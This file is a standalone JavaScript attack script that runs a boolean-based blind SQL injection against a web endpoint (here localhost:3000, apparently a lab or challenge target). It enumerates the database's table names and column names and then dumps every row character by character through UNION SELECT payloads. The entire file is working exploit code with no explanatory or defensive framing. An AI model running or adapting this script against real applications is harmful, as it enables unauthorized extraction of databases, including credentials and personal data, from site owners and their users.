const URL = 'http://localhost:3000/static';
const CHARS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!@#$%^&*()-=+[]{};:\'",.<>/?';

async function isTrue(payload) {
    try {
        const resp = await fetch(`${URL}?id=${encodeURIComponent(payload)}`);
        const text = await resp.text();
        return text.trim() === 'TRUE';
    } catch (error) {
        return false;
    }
}

async function discoverTableNames() {
    let tableCount = 1;
    while (true) {
        const payload = `' UNION SELECT 'a' WHERE (SELECT COUNT(TABLE_NAME) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE')=${tableCount}--`;
        if (await isTrue(payload)) {
            break;
        }
        tableCount++;
    }
    const tables = [];
    for (let idx = 1; idx <= tableCount; idx++) {
        process.stdout.write(`Dumping table ${idx}/${tableCount} name: `);
        let len = 0;
        while (true) {
            const payload = `' UNION SELECT 'a' WHERE (SELECT LEN(T.TABLE_NAME) FROM (SELECT ROW_NUMBER() OVER (ORDER BY (SELECT NULL)) AS rownum, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE') AS T WHERE T.rownum=${idx})=${len}--`;
            if (await isTrue(payload)) {
                break;
            }
            len++;
        }
        let tableName = '';
        for (let pos = 1; pos <= len; pos++) {
            for (const c of CHARS) {
                const payload = `' UNION SELECT 'a' WHERE (SELECT SUBSTRING(T.TABLE_NAME,${pos},1) FROM (SELECT ROW_NUMBER() OVER (ORDER BY (SELECT NULL)) AS rownum, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE') AS T WHERE T.rownum=${idx})='${c}'--`;
                if (await isTrue(payload)) {
                    tableName += c;
                    process.stdout.write(c)
                    break;
                }
            }
        }
        tables.push(tableName);
        console.log()
    }
    return tables;
}

async function discoverColumnNames(tableName) {
    let columnCount = 0;
    while (true) {
        const payload = `' UNION SELECT 'a' WHERE (SELECT COUNT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '${tableName}')=${columnCount}--`;
        if (await isTrue(payload)) {
            break
        }
        columnCount++;
    }
    const discoveredColumns = [];
    for (let colIndex = 1; colIndex <= columnCount; colIndex++) {
        process.stdout.write(`Dumping column ${colIndex}/${columnCount} name: `);
        let columnName = '';
        let nameLength = 0;
        while (true) {
            const payload = `' UNION SELECT 'a' WHERE (SELECT LEN(T.COLUMN_NAME) FROM (SELECT ROW_NUMBER() OVER (ORDER BY (SELECT NULL)) as row_num, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '${tableName}') AS T WHERE T.row_num = ${colIndex})=${nameLength}--`;
            if (await isTrue(payload)) {
                break;
            }
            nameLength++;
        }
        for (let charIndex = 1; charIndex <= nameLength; charIndex++) {
            for (const c of CHARS) {
                const payload = `' UNION SELECT 'a' WHERE (SELECT SUBSTRING(T.COLUMN_NAME, ${charIndex}, 1) FROM (SELECT ROW_NUMBER() OVER (ORDER BY (SELECT NULL)) as row_num, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '${tableName}') AS T WHERE T.row_num = ${colIndex})='${c}'--`;
                if (await isTrue(payload)) {
                    columnName += c;
                    process.stdout.write(c)
                    break;
                }
            }
        }
        console.log()
        discoveredColumns.push(columnName);
    }
    return discoveredColumns;
}

async function dumpFieldValue(id, fieldName, tableName) {
    let length = -1;
    while (true) {
        const payload = `' UNION SELECT 'a' WHERE (SELECT LEN(${fieldName}) FROM ${tableName} WHERE id=${id})=${length}--`;
        if (await isTrue(payload)) {
            break;
        }
        length++;
    }
    if (length === -1) return null;
    if (length === 0) return "";

    let value = '';
    for (let i = 1; i <= length; i++) {
        let foundChar = false;
        for (const c of CHARS) {
            const payload = `' UNION SELECT 'a' WHERE (SELECT SUBSTRING(CAST(${fieldName} AS VARCHAR(255)),${i},1) FROM ${tableName} WHERE id=${id})='${c}'--`;
            if (await isTrue(payload)) {
                value += c;
                foundChar = true;
                break;
            }
        }
        if (!foundChar) {
            value += '?';
        }
    }
    return value;
}

async function dumpTable(tableName) {
    console.log(`\nTrying to dump ${tableName}`);
    const fieldsToDump = await discoverColumnNames(tableName);
    console.log(`\nColumns to dump: [${fieldsToDump.join(', ')}]`);
    for (let id = 1;; id++) {
        console.log(`\nTrying to dump data with id=${id}`);
        const dataExistsPayload = `' UNION SELECT 'a' WHERE EXISTS(SELECT 1 FROM ${tableName} WHERE id=${id})--`;
        if (!(await isTrue(dataExistsPayload))) {
            console.log(`No data found at id=${id}. ${tableName} finished.`);
            break;
        }
        const data = {
            id
        };
        for (const field of fieldsToDump) {
            const fieldValue = await dumpFieldValue(id, field, tableName);
            if (fieldValue !== null) {
                data[field] = fieldValue;
            } else {
                console.log(`Failed to dump field '${field}'.`);
                data[field] = null;
            }
        }
        console.log(`Full record for id=${id}:`, data);
    }
}

(async () => {
    const tablesToDump = await discoverTableNames()
    for (const table of tablesToDump) {
        console.log('\n------------------------------------')
        await dumpTable(table)
    }
})();